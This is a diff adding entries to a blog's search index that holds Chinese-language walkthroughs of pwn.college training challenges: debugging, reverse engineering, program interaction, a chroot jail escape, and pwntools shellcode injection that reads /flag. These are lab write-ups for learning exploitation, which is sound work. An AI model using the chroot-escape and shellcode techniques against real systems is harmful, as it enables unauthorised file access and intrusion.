@@ -3171,4 +3171,172 @@ rbx = rsi module 65536        ;2^16
         <tag>pwncollege</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Debugging Refresher</title>
+    <url>/2022/02/14/Debugging%20Refresher/</url>
+    <content><![CDATA[<html><head></head><body><h4 id="Level1">Level1<a class="post-anchor" href="#Level1"></a></h4><p>​        直接r，然后c到断点。</p>
+<h4 id="Level2">Level2<a class="post-anchor" href="#Level2"></a></h4><p>​        <code>p/x $r12</code></p>
+<h4 id="Level3">Level3<a class="post-anchor" href="#Level3"></a></h4><p>​        不好描述，可以根据后面的正确随机数在栈中找到对应的位置，然后重新执行并输入。</p>
+<h4 id="Level4">Level4<a class="post-anchor" href="#Level4"></a></h4><p>​        。。。。</p>
+<h4 id="Level5">Level5<a class="post-anchor" href="#Level5"></a></h4><p>gdb脚本。</p>
+</body></html>]]></content>
+      <tags>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ReverseEngineering</title>
+    <url>/2022/02/15/ReverseEngineering/</url>
+    <content><![CDATA[<html><head></head><body><h4 id="Level1-0">Level1.0<a class="post-anchor" href="#Level1-0"></a></h4><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8A%E5%8D%884.12.04.png" data-caption="截屏2022-02-15 上午4.12.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8A%E5%8D%884.12.04.png" alt="截屏2022-02-15 上午4.12.04"></a></p>
+<h4 id="Level1-1">Level1.1<a class="post-anchor" href="#Level1-1"></a></h4><p>​        同上，一样的做法。</p>
+<h4 id="Level2-0">Level2.0<a class="post-anchor" href="#Level2-0"></a></h4><p>​        交换idx3和idx4的位置</p>
+<h4 id="Level2-1">Level2.1<a class="post-anchor" href="#Level2-1"></a></h4><p>​        交换idx1和idx4.</p>
+<p>​        ps：</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%883.28.51.png" data-caption="截屏2022-02-15 下午3.28.51" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%883.28.51.png" alt="截屏2022-02-15 下午3.28.51"></a></p>
+<p>​        输入五个字符，转化为ascii后以int类型贮存，从栈布局可以看出v10大小是4个字，所以第五个字被储存在v11。</p>
+<h4 id="Level3-0">Level3.0<a class="post-anchor" href="#Level3-0"></a></h4><p>​        reverse</p>
+<h4 id="Level3-1">Level3.1<a class="post-anchor" href="#Level3-1"></a></h4><p>​        同上。</p>
+<h4 id="Level4-0">Level4.0<a class="post-anchor" href="#Level4-0"></a></h4><pre><code class="c"> for ( j = 0; j &lt;= 3; ++j )
+  {
+    for ( k = 0; k &lt; 4 - j; ++k )
+    {
+      if ( *((_BYTE *)&amp;v15 + k - 14) &gt; *((_BYTE *)&amp;v15 + k - 13) )
+      {
+        v4 = *((_BYTE *)&amp;v15 + k - 14);
+        *((_BYTE *)&amp;v15 + k - 14) = *((_BYTE *)&amp;v15 + k - 13);
+        *((_BYTE *)&amp;v15 + k - 13) = v4;
+      }
+    }
+  }
+</code></pre>
+<p>​        一个简单的冒泡排序算法。</p>
+<h4 id="level4-1">level4.1<a class="post-anchor" href="#level4-1"></a></h4><p>​        同上</p>
+<h4 id="Level5-0">Level5.0<a class="post-anchor" href="#Level5-0"></a></h4><pre><code class="c"> for ( j = 0; j &lt;= 4; ++j )
+    *((_BYTE *)&amp;v13 + j - 14) ^= 0xCDu;
+</code></pre>
+<p>​        异或加密，需要用到简单的脚本（手抠也不是不行）</p>
+<h4 id="Level5-1">Level5.1<a class="post-anchor" href="#Level5-1"></a></h4><p>​        同上，好饿。</p>
+<h4 id="Level6-0">Level6.0<a class="post-anchor" href="#Level6-0"></a></h4><p>​        可以批量导出数据，避免手动处理数组</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%885.15.04.png" data-caption="截屏2022-02-15 下午5.15.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%885.15.04.png" alt="截屏2022-02-15 下午5.15.04"></a></p>
+<p>​        程序的逻辑是输入的字符串进行降序排序-&gt;条件异或，我们需要通过结果反推输入值，</p>
+<p>​        因为程序一定会对字符串进行降序排序，所以输入字符串的顺序其实意义不大，无论是怎么打乱，最后处理的结果都是一样的。</p>
+<pre><code class="python">x = [0x64, 0x59, 0x60, 0x59, 0x7F, 0x40, 0x77, 0x4E, 0x77, 0x4C, 0x75, 0x4D, 0x73, 0x4B, 0x71]
+for i in range(15):
+    if (i % 2  == 0):
+        x[i] ^= 0x10
+    else:
+      x[i] ^= 0x29
+
+    a = chr(x[i])
+    print(a)
+</code></pre>
+</body></html>]]></content>
+      <tags>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sandboxing</title>
+    <url>/2022/02/28/Sandboxing/</url>
+    <content><![CDATA[<html><head></head><body><h4 id="Level1">Level1<a class="post-anchor" href="#Level1"></a></h4><p>​        首先考察<code>chroot</code></p>
+<p>​        因为程序在将根目录设置为<code>/jail</code>的时候并没有切换当前工作目录为<code>/jail</code>，所以我们实际上还是在<code>/</code>目录，因此可以直接通过<code>argv[1]</code>    读取flag。</p>
+<p>​        执行脚本的时候需要添加<code>cwd</code>参数，使其工作目录为<code>/</code></p>
+<h4 id="Level2">Level2<a class="post-anchor" href="#Level2"></a></h4><pre><code class="python">shellcode = asm(shellcraft.readfile('flag',1))
+p = process(["/challenge/babyjail_level2", "/"],cwd='/')
+p.send(shellcode)
+</code></pre>
+<h4 id="Level3">Level3<a class="post-anchor" href="#Level3"></a></h4><p>​            关键源码：</p>
+<pre><code class="c"> assert(argc &gt; 1);
+
+    puts("Checking to make sure you're not trying to open the flag.\n");
+    assert(strstr(argv[1], "flag") == NULL);
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+    if (fd &lt; 0)
+        printf("Failed to open the file located at `%s`.\n", argv[1]);
+    else
+        printf("Successfully opened the file located at `%s`.\n", argv[1]);
+
+    char jail_path[] = "/tmp/jail-XXXXXX";
+    assert(mkdtemp(jail_path) != NULL);
+
+    printf("Creating a jail at `%s`.\n", jail_path);
+
+    assert(chroot(jail_path) == 0);
+
+    puts("Moving the current working directory into the jail.\n");
+    assert(chdir("/") == 0);
+
+    int fffd = open("/flag", O_WRONLY | O_CREAT);
+    write(fffd, "FLAG{FAKE}", 10);
+    close(fffd);
+
+</code></pre>
+</body></html>]]></content>
+      <tags>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Program_interaction</title>
+    <url>/2022/01/17/Program_interaction/</url>
+    <content><![CDATA[<html><head></head><body><p>「前面不太记得了，从level3记起」</p>
+<h3 id="level3">level3<a class="post-anchor" href="#level3"></a></h3><p><code> ./embryoio_level3  xkbdyoisnx</code>    </p>
+<h4 id="Level4">Level4<a class="post-anchor" href="#Level4"></a></h4><p><code>export jouixn = xxx</code></p>
+<h4 id="Level5">Level5<a class="post-anchor" href="#Level5"></a></h4><p>​    一个标准输入重定向的考察，</p>
+<p><code>./embryoio_level5 &lt; /tmp/mihsjr</code></p>
+<p>​        还需要编辑<code>mihsjr </code>的内容为给的密码。</p>
+<h4 id="Level6">Level6<a class="post-anchor" href="#Level6"></a></h4><p>​        一个输出重定向，创建对应文件<code>./embryoio_level6 &gt; /tmp/ptyaid </code>，flag在<code>ptyaid</code>中。</p>
+<h4 id="Level7">Level7<a class="post-anchor" href="#Level7"></a></h4><p><code>env -i ./xxx</code></p>
+<h4 id="Level8">Level8<a class="post-anchor" href="#Level8"></a></h4><p>​        写个sh脚本，内容是打开这个题目。注意路径。</p>
+<pre><code class="bash">hacker@embryoio_level8:~$ cat my_script.sh 
+/challenge/embryoio_level8
+</code></pre>
+<h4 id="Level9">Level9<a class="post-anchor" href="#Level9"></a></h4><p>​        与level8同理，顺手输个密码就行。</p>
+<h4 id="Level10">Level10<a class="post-anchor" href="#Level10"></a></h4><p>​        同level3</p>
+<h4 id="Level11">Level11<a class="post-anchor" href="#Level11"></a></h4><p>​        同level4。</p>
+<h4 id="Level12">Level12<a class="post-anchor" href="#Level12"></a></h4><p>​        同level5</p>
+<h4 id="Level13">Level13<a class="post-anchor" href="#Level13"></a></h4><p>​        同level6</p>
+<h4 id="Level14">Level14<a class="post-anchor" href="#Level14"></a></h4><p>​        同level7</p>
+<h4 id="Level15">Level15<a class="post-anchor" href="#Level15"></a></h4><p>​        一言难尽，可以在ipython里用pwntools。</p>
+<h4 id="Level16">Level16<a class="post-anchor" href="#Level16"></a></h4><p>​        同15。</p>
+<h4 id="Level17">Level17<a class="post-anchor" href="#Level17"></a></h4><p>​        这几个level就是将python与之前level的命令行参数或者环境变量结合，虽然难度不高但是很考验pwntools运用的熟练度。所以我还没有找到做出来的方法。</p>
+<h4 id="Level18">Level18<a class="post-anchor" href="#Level18"></a></h4><p>​        利用python设置环境变量，主要利用到<code>os.environ</code>或者<code>os.putenv</code>函数。</p>
+<h4 id="Level19">Level19<a class="post-anchor" href="#Level19"></a></h4><p>​        </p>
+</body></html>]]></content>
+      <tags>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shellcode_Injection</title>
+    <url>/2022/01/29/Shellcode_Injection/</url>
+    <content><![CDATA[<html><head></head><body><p>​        整个专题其实就是一个shellcode编写的小练习，并不需要自己寻找漏洞点，写好shellcode直接注入就行。</p>
+<p>​        如果要将服务器的文件传输到本地的话可以使用:</p>
+<pre><code class="bash"> scp -i key -r hacker@dojo.pwn.college:/challenge [本地路径]
+</code></pre>
+<h4 id="Level1">Level1<a class="post-anchor" href="#Level1"></a></h4><p>​        可以用pwntools的shellcraft模块，但是也可以手写shellcode。</p>
+<p>​        这道题可以用简单的orw的思路做。但是shellcode的地址需要在规定的地方。</p>
+<pre><code class="python">shellcode = shellcraft.amd64.open("/flag")        
+shellcode += shellcraft.amd64.read('rax', stack + 0x100, 0x100)
+shellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100)
+</code></pre>
+<h4 id="Level2">Level2<a class="post-anchor" href="#Level2"></a></h4><pre><code class="python">shellcode = shellcraft.amd64.nop()*0x800
+shellcode = shellcraft.amd64.open("/flag")        
+shellcode += shellcraft.amd64.read('rax', stack + 0x100, 0x100)
+shellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100)
+</code></pre>
+<h4 id="Level3">Level3<a class="post-anchor" href="#Level3"></a></h4><p>​        换个地址就行</p>
+<h4 id="Level4">Level4<a class="post-anchor" href="#Level4"></a></h4><p>​        shellcode不能含有”H”。</p>
+<p>​        第一个想到的就是不能含有<code>push</code>，其他指令似乎也没有h了。想要完成的话第一个思路是手写不含push的shellcode，另外一个思路是构造跳板读取其他位置的shellcode（这种思路其实比较常见并且配套的视频中也提到过）</p>
+<p>​        但是实际做题体验极差，写了read()后，读取的shellcode无论怎样都无法读到flag，明明已经getshell了，也没有eof，但是就是没办法。以后再想吧。</p>
+<h4 id="Level5">Level5<a class="post-anchor" href="#Level5"></a></h4><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-18%20%E4%B8%8B%E5%8D%8810.02.44.png" data-caption="截屏2022-02-18 下午10.02.44" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-18%20%E4%B8%8B%E5%8D%8810.02.44.png" alt="截屏2022-02-18 下午10.02.44"></a></p>
+<p>​        需要让shellcode在运行时生成<code>syscall()</code>。</p>
+<p>一个比较自然的想法就是把对应的机器码储存在寄存器中，然后拿出来用。</p>
+<p><code>int 0x80</code>对应的机器码<code>CD 80 </code></p>
+</body></html>]]></content>
+      <tags>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
 </search>
